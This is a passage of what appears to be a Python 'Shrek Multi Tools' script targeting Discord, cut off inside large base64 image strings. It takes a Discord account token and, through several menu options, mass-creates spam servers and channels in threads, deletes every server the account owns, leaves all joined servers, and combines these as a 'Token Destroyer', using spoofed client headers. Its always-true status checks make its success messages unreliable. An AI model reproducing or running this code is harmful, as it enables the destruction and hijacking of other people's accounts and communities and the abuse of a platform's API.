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"
          for x in range(15):
              try:
                r = requests.post(url,headers=header, json={'name':"Nuked By Shrek", 'icon':image})
                if r.status_code == 200 or 204 or 201:
                    print("Done!")
                    ids.append(r.json()['id'])
                else:
                    print("Failed")
              except Exception as e:
                print('Max Server Limit Acceded')

      def channelmake():
          length = len(ids)
          for b in range(length):
              for i in range(15):
                  url1 = f'https://discord.com/api/v9/guilds/{ids[b]}/channels'
                  r = requests.post(url1, headers=header, json={'name':'nuked-by-Shrek'})

      threads = []

      for _ in range(20):
          t = threading.Thread(target=servercreate)
          t.daemon = True
          t.start()
          threads.append(t)

      for thread in threads:
          t.join()

      threaad = []

      for r in range(50):
          a = threading.Thread(target=channelmake)
          a.daemon = True
          a.start()
          threaad.append(a)

      for thread in threaad:
          a.join()

    elif options4 in ['4','04']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Server Deleter")
      print(f'''
  {Fore.GREEN}
  ██████ ▓█████ ██▀███   ██▒   █▓▓█████ ██▀███       ▓█████▄ ▓█████ ██▓   ▓█████▄▄▄█████▓▓█████ ██▀███  
▒██    ▒ ▓█   ▀▓██ ▒ ██▒▓██░   █▒▓█   ▀▓██ ▒ ██▒     ▒██▀ ██▌▓█   ▀▓██▒   ▓█   ▀▓  ██▒ ▓▒▓█   ▀▓██ ▒ ██▒
░ ▓██▄   ▒███  ▓██ ░▄█ ▒ ▓██  █▒░▒███  ▓██ ░▄█ ▒     ░██   █▌▒███  ▒██░   ▒███  ▒ ▓██░ ▒░▒███  ▓██ ░▄█ ▒
  ▒   ██▒▒▓█  ▄▒██▀▀█▄    ▒██ █░░▒▓█  ▄▒██▀▀█▄      ▒░▓█▄   ▌▒▓█  ▄▒██░   ▒▓█  ▄░ ▓██▓ ░ ▒▓█  ▄▒██▀▀█▄  
▒██████▒▒░▒████░██▓ ▒██▒   ▒▀█░  ░▒████░██▓ ▒██▒    ░░▒████▓ ░▒████░██████░▒████  ▒██▒ ░ ░▒████░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░░ ▒░ ░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░ ▒▓ ░▒▓░    ░ ▒▒▓  ▒ ░░ ▒░ ░ ▒░▓  ░░ ▒░   ▒ ░░   ░░ ▒░ ░ ▒▓ ░▒▓░
░ ░▒  ░   ░ ░    ░▒ ░ ▒░   ░ ░░   ░ ░    ░▒ ░ ▒░      ░ ▒  ▒  ░ ░  ░ ░ ▒   ░ ░      ░     ░ ░    ░▒ ░ ▒░
░  ░  ░     ░     ░   ░      ░░     ░     ░   ░       ░ ░  ░    ░    ░ ░     ░    ░ ░       ░     ░   ░ 
      ░     ░     ░           ░     ░     ░             ░       ░      ░     ░              ░     ░     


      ''')
      url = f'https://discord.com/api/v9/users/@me/guilds'
      tukan = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the token that you want to delete all owned servers on?: ''')

      header = {
          "authority": "discord.com",
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f'{tukan}',
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      r = requests.get(url, headers=header).json()

      for x in r:
          t = requests.post(f"https://discord.com/api/v9/guilds/{x['id']}/delete",headers=header,)
          if t.status_code == 204:
              print(f'Deleted {x["id"]}')
          else:
              print(f'Failed to delete {x["id"]}')
      print(Fore.WHITE + "Deleted all personal servers!")

    elif options4 in ['5','05']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Leaver Server") 
      print(f'''
{Fore.GREEN}
  ██████ ▓█████ ██▀███   ██▒   █▓▓█████ ██▀███       ██▓   ▓█████ ▄▄▄      ██▒   █▓▓█████ ██▀███  
▒██    ▒ ▓█   ▀▓██ ▒ ██▒▓██░   █▒▓█   ▀▓██ ▒ ██▒    ▓██▒   ▓█   ▀▒████▄   ▓██░   █▒▓█   ▀▓██ ▒ ██▒
░ ▓██▄   ▒███  ▓██ ░▄█ ▒ ▓██  █▒░▒███  ▓██ ░▄█ ▒    ▒██░   ▒███  ▒██  ▀█▄  ▓██  █▒░▒███  ▓██ ░▄█ ▒
  ▒   ██▒▒▓█  ▄▒██▀▀█▄    ▒██ █░░▒▓█  ▄▒██▀▀█▄      ▒██░   ▒▓█  ▄░██▄▄▄▄██  ▒██ █░░▒▓█  ▄▒██▀▀█▄  
▒██████▒▒░▒████░██▓ ▒██▒   ▒▀█░  ░▒████░██▓ ▒██▒    ░██████░▒████ ▓█   ▓██   ▒▀█░  ░▒████░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░░ ▒░ ░ ▒▓ ░▒▓░   ░ ▐░  ░░ ▒░ ░ ▒▓ ░▒▓░    ░ ▒░▓  ░░ ▒░  ▒▒   ▓▒█   ░ ▐░  ░░ ▒░ ░ ▒▓ ░▒▓░
░ ░▒  ░   ░ ░    ░▒ ░ ▒░   ░ ░░   ░ ░    ░▒ ░ ▒░    ░ ░ ▒   ░ ░    ░   ▒▒    ░ ░░   ░ ░    ░▒ ░ ▒░
░  ░  ░     ░     ░   ░      ░░     ░     ░   ░       ░ ░     ░    ░   ▒       ░░     ░     ░   ░ 
      ░     ░     ░           ░     ░     ░             ░     ░        ░        ░     ░     ░     


''')
      url = 'https://discord.com/api/v9/users/@me/guilds'
      tukan = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the token that you want to leave all servers with?: ''')

      header = {
          "authority": "discord.com",
          "method": "DELETE",
          "path": "/api/v9/users/@me/guilds/",
          "scheme": "https",
          "accept": "*/*",
          "accept-encoding": "gzip, deflate, br",
          "accept-language": "en-US",
          "Authorization": f'{tukan}',
          "content-length": "0",
          "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
          "origin": "https://discord.com",
          'referer': 'https://discord.com/channels/@me',
          "sec-fetch-dest": "empty",
          "sec-fetch-mode": "cors",
          "sec-fetch-site": "same-origin",
          "user-agent": useragent(),
          "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
          "x-debug-options": "bugReporterEnabled",
          "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
      }

      r = requests.get(url,headers=header).json()
      for i in r:
          t = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{i["id"]}',headers=header)
          if t.status_code == 204 or 200:
              print(f"Succefully left {i['id']}")
          else:
              print(t)

    elif options4 in ['6','06']:
        cls()
        ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Token Destroyer")
        print(f'''
    {Fore.GREEN}
▒█████▄  ▒█████  ██████ ▄███████▓ ██▀███   ▒█████  ▓██   ██▓ ▓█████ ██▀███  
▒██▀ ██▌ ▒█   ▀▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒ ▒██  ██▒ ▓█   ▀▓██ ▒ ██▒
░██   █▌ ▒███  ░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒  ▒██ ██░ ▒███  ▓██ ░▄█ ▒
░▓█▄   ▌ ▒▓█  ▄  ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░  ░ ▐██▓░ ▒▓█  ▄▒██▀▀█▄  
░▒████▓ ▒░▒████▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░  ░ ██▒▓░▒░▒████░██▓ ▒██▒
 ▒▒▓  ▒ ░░░ ▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░    ██▒▒▒ ░░░ ▒░ ░ ▒▓ ░▒▓░
 ░ ▒  ▒ ░ ░ ░  ░ ░▒  ░ ░    ░      ░▒ ░ ▒   ░ ▒ ▒░  ▓██ ░▒░ ░ ░ ░    ░▒ ░ ▒ 
 ░ ░  ░     ░  ░  ░  ░    ░        ░░   ░ ░ ░ ░ ▒   ▒ ▒ ░░      ░    ░░   ░ 
   ░    ░   ░        ░              ░         ░ ░   ░ ░     ░   ░     ░     


        ''')

        url = f'https://discord.com/api/v9/users/@me/guilds'
        tukan = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the token that you want to destroy?: ''')

        header = {
            "authority": "discord.com",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f'{tukan}',
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        r = requests.get(url, headers=header).json()

        for x in r:
            t = requests.post(f"https://discord.com/api/v9/guilds/{x['id']}/delete",headers=header,)
            if t.status_code == 204 or 200:
                print(f'Deleted {x["id"]}')
            else:              
              for i in r:
                  e = requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{i["id"]}',headers=header)
                  if e.status_code == 200 or 204:
                      print(f'Left {i["id"]}')
                  else:
                      print(e)

        print(Fore.WHITE + "Deleted all personal servers!")
        print(Fore.WHITE + "Left all servers!")

        url3 =  "data:image/jpeg;base64,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